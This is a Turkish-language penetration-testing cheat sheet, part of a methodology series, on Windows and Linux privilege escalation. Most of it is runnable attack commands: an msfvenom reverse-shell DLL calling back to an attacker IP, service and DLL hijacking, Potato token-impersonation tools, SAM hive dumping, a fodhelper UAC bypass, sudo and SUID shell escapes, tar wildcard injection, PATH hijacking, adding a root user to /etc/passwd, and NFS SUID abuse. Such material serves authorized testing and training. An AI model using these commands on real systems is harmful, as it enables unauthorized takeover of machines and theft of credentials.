# ⬆️ Faz 3: Yetki Yükseltme (Privilege Escalation)

[🇬🇧 English](../03-Privilege-Escalation.md) • [🇮🇹 Versione Italiana](03-Privilege-Escalation.it.md)

```
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

**Hedef:** Yetkileri standart bir kullanıcı seviyesinden Administrator/SYSTEM (Windows) veya root (Linux) seviyesine çıkarmak.

> 📚 **Detaylı Kılavuzlar:** [Windows PrivEsc](../../Windows-PrivEsc/README.md) | [Linux PrivEsc](../../Linux-PrivEsc/README.md)

---

## 🖥️ Windows Yetki Yükseltme (Windows PrivEsc)

### İlk Kontrol Edilecekler (Quick Wins)
```cmd
# Mevcut kullanıcının özel izinleri ve grupları
whoami /priv
whoami /groups

# Kayıtlı kimlik bilgileri
cmdkey /list

# Kurulum dosyalarında açık metin parolalar
dir /s C:\*unattend.xml C:\*sysprep.inf C:\*sysprep.xml 2>nul

# AlwaysInstallElevated (MSI paketlerinin SYSTEM yetkisinde çalıştırılması)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Servis Açıklarının İstismarı

#### Tırnak İşaretsiz Servis Yolu (Unquoted Service Path)
```cmd
# Tırnak işareti olmayan ve boşluk içeren yolları bulma
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Bulunursa (Örn: C:\Program Files\Some Service\service.exe):
# Zararlı exe'yi şu konumlara yerleştirebilirsiniz: C:\Program.exe veya C:\Program Files\Some.exe
```

#### Zayıf Servis İzinleri (Weak Service Permissions)
```cmd
# Accesschk ile servis izinlerini kontrol etme
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# Eğer SERVICE_CHANGE_CONFIG izniniz varsa:
sc config VulnService binpath="C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

#### DLL Ele Geçirme (DLL Hijacking)
```powershell
# Eksik DLL çağrılarını tespit edin (Process Monitor ile)
# Zararlı DLL dosyasını servis dizinine kopyalayın
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### Belirteç Taklit Saldırıları (Token Impersonation)

#### SeImpersonatePrivilege (Potato Saldırıları)
```cmd
# SeImpersonatePrivilege iznini kontrol etme
whoami /priv

# PrintSpoofer (Windows 10 / Server 2016-2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Windows Server 2012 - 2022)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\temp\shell.exe"

# JuicyPotato (Windows 7 / Server 2008-2016)
.\JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}
```

#### SeBackupPrivilege
```powershell
# SAM ve SYSTEM registry kovanlarını dışa aktarma
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Saldırgan makinesinde yerel olarak hash'leri çıkarma
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Kayıt Defteri (Registry) İstismarları
```cmd
# Otomatik başlayan programlar (AutoRun)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Yazılabilir zamanlanmış görev yolları
schtasks /query /fo LIST /v | findstr /i "Task To Run"

# Registry anahtar izinleri
accesschk.exe -kvw hklm\SOFTWARE
```

### UAC Atlatma (UAC Bypass)
```powershell
# Fodhelper atlatma tekniği (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

### Otomatik Araçlar
```bash
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024.xlsx
```

---

## 🐧 Linux Yetki Yükseltme (Linux PrivEsc)

### İlk Kontrol Edilecekler (Quick Wins)
```bash
# Sudo izinleri
sudo -l

# SUID yetkili ikili dosyalar
find / -perm -4000 -type f 2>/dev/null

# Yazılabilir /etc/passwd kontrolü
ls -la /etc/passwd

# Kernel exploit olasılığı için sürüm kontrolü
uname -a
```

### Sudo İstismarları

#### Parolasız Sudo Yetkileri (NOPASSWD)
```bash
# Eğer sudo -l çıktısında: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# Eğer sudo -l çıktısında: (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# Eğer sudo -l çıktısında: (ALL) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/sh")'
```

#### Sudo Sürüm Güvenlik Açığı (Baron Samedit - CVE-2021-3156)
```bash
# Sudo sürümünü kontrol etme
sudo --version

# Sudo sürümü < 1.9.5p2 ise
# CVE-2021-3156 istismar kodunu çalıştırın
```

### SUID / SGID Dosyaları
```bash
# Sistemdeki SUID dosyalarını arama
find / -perm -4000 -type f 2>/dev/null

# GTFOBins üzerinden istismar yöntemini kontrol edin:
# https://gtfobins.github.io/

# Örnek: /usr/bin/find üzerinde SUID varsa:
/usr/bin/find . -exec /bin/sh -p \; -quit

# Örnek: /usr/bin/vim üzerinde SUID varsa:
/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Örnek: /usr/bin/python üzerinde SUID varsa:
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Linux Yetenekleri (Capabilities)
```bash
# Tanımlı yetenekleri listeleme
getcap -r / 2>/dev/null

# Örnek: python ikili dosyasında cap_setuid yetkisi varsa:
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Zamanlanmış Görevler (Cron Jobs)
```bash
# Cron görevlerini kontrol etme
cat /etc/crontab
ls -la /etc/cron.*

# Yazılabilir scriptleri kontrol edin
# Tar wildcard enjeksiyonu:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

### PATH Hijacking (Ortam Değişkeni İstismarı)
```bash
# Bir script veya cron görevi tam yol belirtmeden komut çalıştırıyorsa
# Yazılabilir PATH dizininde aynı isimde zararlı script oluşturma:

echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
```

### Yazılabilir /etc/passwd İstismarı
```bash
# Eğer /etc/passwd dosyasına yazma izniniz varsa:
# Yeni bir parola hash'i üretin
openssl passwd -1 -salt evil password123

# Root yetkisinde (UID 0) yeni kullanıcı ekleyin
echo 'evil:$1$evil$xyz...:0:0::/root:/bin/bash' >> /etc/passwd

# Yeni root kullanıcısına geçin
su evil
```

### Çekirdek (Kernel) Exploitleri
```bash
# Kernel sürümü
uname -r
cat /proc/version

# Exploit veritabanında arama
searchsploit linux kernel 4.4 privilege escalation

# Popüler Kernel Exploitleri:
# - DirtyCow (CVE-2016-5195) - Kernel 2.x - 4.x
# - DirtyPipe (CVE-2022-0847) - Kernel 5.8 - 5.16.11
```

### NFS İstismarı (no_root_squash)
```bash
# NFS paylaşımlarını kontrol etme
showmount -e 192.168.1.10
cat /etc/exports

# Eğer no_root_squash aktifse:
# Paylaşımı kendi makinenize bağlayıp root olarak SUID bash ekleyin
mount -t nfs 192.168.1.10:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash

# Hedef sistemde çalıştırın:
/mnt/bash -p
```

### Otomatik Araçlar
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux-exploit-suggester
./linux-exploit-suggester.sh

# LSE (Linux Smart Enumeration)
./lse.sh -l 2
```

---

## 📊 Hızlı Başvuru Kontrol Listesi

### Windows Kontrol Listesi
```markdown
- [ ] whoami /priv (SeImpersonate, SeBackup vb.)
- [ ] Tırnak işaretsiz servis yolları (Unquoted Service Paths)
- [ ] Zayıf servis izinleri (Weak Service Permissions)
- [ ] AlwaysInstallElevated kontrolü
- [ ] Kayıtlı kimlik bilgileri (cmdkey /list)
- [ ] Unattend / Sysprep dosyaları
- [ ] Zamanlanmış görevler (Scheduled Tasks)
- [ ] WinPEAS / PowerUp taraması
```

### Linux Kontrol Listesi
```markdown
- [ ] sudo -l çıktıları
- [ ] SUID/SGID yetkili dosyalar (GTFOBins referansı)
- [ ] Linux Capabilities (getcap)
- [ ] Cron görevleri (yazılabilir scriptler, wildcard'lar)
- [ ] /etc/passwd yazma izni
- [ ] Kernel sürümü ve exploit olasılığı
- [ ] NFS no_root_squash ayarı
- [ ] LinPEAS taraması
```

---

## 🔗 İlgili Kılavuzlar

- [Windows PrivEsc (Kapsamlı)](../../Windows-PrivEsc/README.md)
- [Linux PrivEsc (Kapsamlı)](../../Linux-PrivEsc/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**Önceki Aşama:** [← 02 - Keşif ve Numaralandırma (Enumeration)](./02-Enumeration.tr.md)  
**Sonraki Aşama:** [04 - Yatay İlerleme (Lateral Movement) →](./04-Lateral-Movement.tr.md)
